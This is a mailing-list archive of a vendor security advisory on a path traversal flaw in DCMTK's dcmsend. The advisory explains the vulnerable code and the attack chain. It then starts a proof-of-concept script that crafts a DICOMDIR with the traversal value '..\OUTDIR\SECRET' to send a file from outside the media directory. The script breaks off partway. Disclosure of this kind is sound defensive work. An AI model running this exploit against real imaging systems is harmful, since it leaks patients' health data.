---
title: [SYSS-2026-047]: DICOM Toolkit (DCMTK) - Path traversal	(CWE-22)
url: https://seclists.org/fulldisclosure/2026/Aug/25
source: Full Disclosure
date: 2026-08-06
fetch_date: 2026-08-07T04:29:47.703417
---

# [SYSS-2026-047]: DICOM Toolkit (DCMTK) - Path traversal	(CWE-22)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](24)
[By Date](date.html#25)
[![Next](/images/right-icon-16x16.png)](26)

[![Previous](/images/left-icon-16x16.png)](24)
[By Thread](index.html#25)
[![Next](/images/right-icon-16x16.png)](26)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2026-047]: DICOM Toolkit (DCMTK) - Path traversal (CWE-22)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Fri, 31 Jul 2026 09:59:40 +0200

---

```
Advisory ID:               SYSS-2026-047
Product:                   DCMTK (DICOM ToolKit)
Manufacturer:              OFFIS e.V. / DCMTK Community
Affected Version(s):       3.7.0
Tested Version(s):         3.7.0
Vulnerability Type:        Path traversal (CWE-22)
Risk Level:                High
Solution Status:           Fixed
Manufacturer Notification: 2026-07-02
Solution Date:             2026-07-03
Public Disclosure:         2026-07-31
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

DCMTK (DICOM ToolKit) is an open-source collection of libraries and
applications implementing large parts of the DICOM (Digital Imaging
and Communications in Medicine) standard (see [1]).

DCMTK's dcmsend is vulnerable to path traversal when it is instructed to
read input files from a specially crafted DICOMDIR. This can lead to
unauthorized disclosure of readable DICOM objects, including protected
health information.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The dcmsend command line option --read-from-dicomdir (+rd) enables
DcmStorageSCU::ReadFromDICOMDIRMode. In this mode, a DICOMDIR input file
is not sent itself. Instead, dcmsend reads the DICOMDIR and adds the
referenced SOP instances to its transfer list.

The affected implementation is DcmStorageSCU::addDicomFilesFromDICOMDIR()
in dcmnet/libsrc/dstorscu.cc. The function searches the DICOMDIR dataset
for ReferencedFileID (0004,1500) elements, converts DICOM backslashes to
host path separators with dicomToHostFilename(), and then combines the
result with the DICOMDIR directory:

  const OFFilename tmpFilename(dicomToHostFilename(fileID, tmpString),
                               pathName.usesWideChars());
  OFStandard::combineDirAndFilename(pathName, dirName, tmpFilename,
                                    OFTrue /* allowEmptyDirName */);

dicomToHostFilename() only replaces "\\" with the host path separator.
It does not reject ".." components, absolute paths, or other traversal
patterns. OFStandard::combineDirAndFilename() also does not canonicalize
the result or verify that the final path remains below the DICOMDIR
directory. Therefore, a ReferencedFileID such as "..\\OUTDIR\\SECRET"
becomes a host path like "MEDIA/../OUTDIR/SECRET".

The attack chain is as follows:

  1. The attacker crafts a DICOMDIR with an IMAGE directory record whose
     ReferencedFileID contains traversal components, for example
     "..\\OUTDIR\\SECRET".

  2. The same record contains ReferencedSOPClassUIDInFile,
     ReferencedSOPInstanceUIDInFile, and
     ReferencedTransferSyntaxUIDInFile values matching the targeted DICOM
     object.

  3. The victim runs dcmsend with --read-from-dicomdir (+rd) against the
     crafted DICOMDIR.

  4. dcmsend resolves the ReferencedFileID relative to the DICOMDIR
     location without rejecting the traversal.

  5. dcmsend opens and transmits the traversed DICOM file to the
     configured remote storage SCP.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

To demonstrate this security isssue, a PoC exploit was developed that
sends a DICOM file outside the media directory to an attacker when an
attacker-controlled DICOMDIR is used by dcmsend.

The crafted DICOMDIR contains a path traversal attack vector in
ReferencedFileID.

cat > poc.sh << 'EOPOC'
#!/bin/bash
# Demonstrate DICOMDIR ReferencedFileID path traversal via dcmsend

set -u

WORKDIR="$(mktemp -d /tmp/dcmtk-dcmsend.XXXXXX)"
MEDIA_DIR="${WORKDIR}/MEDIA"
OUTSIDE_DIR="${WORKDIR}/OUTDIR"
RECV_DIR="${WORKDIR}/recv"
TARGET_DUMP="${WORKDIR}/target.dump"
DICOMDIR="${MEDIA_DIR}/DICOMDIR"
TARGET_FILE="${OUTSIDE_DIR}/SECRET"
DCMSEND_LOG="${WORKDIR}/dcmsend.log"
STORESCP_LOG="${WORKDIR}/storescp.log"

cleanup()
{
    if [ -n "${STORESCP_PID:-}" ]; then
        kill "${STORESCP_PID}" 2>/dev/null || true
        wait "${STORESCP_PID}" 2>/dev/null || true
    fi
    rm -rf "${WORKDIR}"
}
trap cleanup EXIT

require_tool()
{
    command -v "$1" >/dev/null 2>&1 || {
        echo "[!] Missing required tool: $1"
        exit 1
    }
}

require_tool dump2dcm
require_tool dcmdump
require_tool dcmsend
require_tool storescp
require_tool python3

mkdir -p "${MEDIA_DIR}" "${OUTSIDE_DIR}" "${RECV_DIR}"

cat > "${TARGET_DUMP}" <<'EOF'
# Dicom-File-Format

# Dicom-Meta-Information-Header
# Used TransferSyntax: Little Endian Explicit
(0002,0001) OB 00\01
(0002,0002) UI =SecondaryCaptureImageStorage
(0002,0003) UI [1.2.826.0.1.3680043.10.543.777.1]
(0002,0010) UI =LittleEndianExplicit
(0002,0012) UI [1.2.826.0.1.3680043.10.543.370]
(0002,0013) SH [H7POC]

# Dicom-Data-Set
# Used TransferSyntax: Little Endian Explicit
(0008,0005) CS [ISO_IR 100]
(0008,0016) UI =SecondaryCaptureImageStorage
(0008,0018) UI [1.2.826.0.1.3680043.10.543.777.1]
(0008,0020) DA [20260630]
(0008,0030) TM [120000]
(0008,0060) CS [OT]
(0008,0064) CS [WSD]
(0010,0010) PN [POC^TRAVERSED]
(0010,0020) LO [H7DCMSEND]
(0020,000d) UI [1.2.826.0.1.3680043.10.543.777.2]
(0020,000e) UI [1.2.826.0.1.3680043.10.543.777.3]
(0020,0010) SH [1]
(0020,0011) IS [1]
(0020,0013) IS [1]
(0028,0002) US 1
(0028,0004) CS [MONOCHROME2]
(0028,0010) US 1
(0028,0011) US 1
(0028,0100) US 8
(0028,0101) US 8
(0028,0102) US 7
(0028,0103) US 0
(7fe0,0010) OB 00\00
EOF

dump2dcm "${TARGET_DUMP}" "${TARGET_FILE}" || exit 1

python3 - "${DICOMDIR}" <<'PY'
import struct
import sys

out = sys.argv[1]

def even(value, pad=b" "):
    return value if len(value) % 2 == 0 else value + pad

def elem(tag, vr, value):
    group, element = tag
    if isinstance(value, str):
        value = value.encode("ascii")
    if vr == "UI":
        value = even(value, b"\0")
```

 elif vr not in ("OB", "OD", "OF", "OL", "OW", "SQ", "UC", "UR",
"UT", "UN"):

```
        value = even(value, b" ")
    data = struct.pack("<HH", group, element) + vr.encode("ascii")
    if vr in ("OB", "OD", "OF", "OL", "OW", "SQ", "UC", "UR", "UT", "UN"):
        data += b"\0\0" + struct.pack("<I", len(value))
    else:
        data += struct.pack("<H", len(value))
    return data + value

def item(content):
    return struct.pack("<HHI", 0xFFFE, 0xE000, len(content)) + content

sop_class = "1.2.840.10008.5.1.4.1.1.7"
sop_inst = "1.2.826.0.1.3680043.10.543.777.1"
transfer_syntax = "1.2.840.10008.1.2.1"

record = b"".join([
    elem((0x0004, 0x1400), "UL", struct.pack("<I", 0)),
    elem((0x0004, 0x1410), "US", struct.pack("<H", 0xFFFF)),
    elem((0x0004, 0x1420), "UL", struct.pack("<I", 0)),
    elem((0x0004, 0x1430), "CS", "IMAGE"),
    elem((0x0004, 0x1500), "CS", r"..\OUTDIR\SECRET"),
    elem((0x0004, 0x1510), "UI", sop_class),
    elem((0x0004, 0x1511), "UI", sop_inst),
    elem((0x0004, 0x1512), "UI", transfer_syntax),
])

dataset = b"".join([
    elem((0x0004, 0x1130), "CS", "H7POC"),
    elem((0x0004, 0x1200), "UL", struct.pack("<I", 0)),
    elem((0x0004, 0x1202), "UL", struct.pack("...